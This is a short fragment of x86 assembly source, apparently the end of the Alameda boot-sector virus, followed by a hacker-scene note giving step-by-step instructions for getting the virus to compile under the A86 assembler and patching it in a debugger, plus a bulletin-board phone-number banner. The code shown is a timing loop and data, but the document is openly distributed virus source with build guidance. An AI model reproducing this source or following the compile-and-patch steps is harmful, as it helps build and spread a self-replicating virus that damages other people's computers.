                loop    l_02F0                  ; Loop if cx > 0

                sub     ah,1
                jnz     l_02F0                  ; Jump if not zero
                retn
KILL_TIME       endp



;DATA                                            ;* No entry point to code
                ;DB      27H,00H,08H,02H                
I_CNTER         DW      1CH                
SCAN_CODE       DW      0                
                ;dw      27h
                ;dw      8       
                ;db      02H, 00H
                ;DB      55H,0AAH

seg_a           ends



                end     BEGIN

;;;;;;;;;;;;;;;;;;;;

the alemeda virus needs some mods before compiling with A86

1) A86 doesn't like POP CS, so change that to NOP
2) A86 guesses wrong, so it doesn't like the DW 0 command at the end of the
   file, change the MOV xx,[ALT_CTRL] to  MOV xx, [ALT_CTRL W] and
   it should compile correctly
3) compile it
4) debug it and go near the end of the phile, that is where the code begins
5) search for the PUSH ES command, and look for the NOP after it
6) Assemble the NOP so it is POP CS

you are done!




        =-------------------------=
        : HACKERS! (214) 641-8815 :
        =-------------------------=

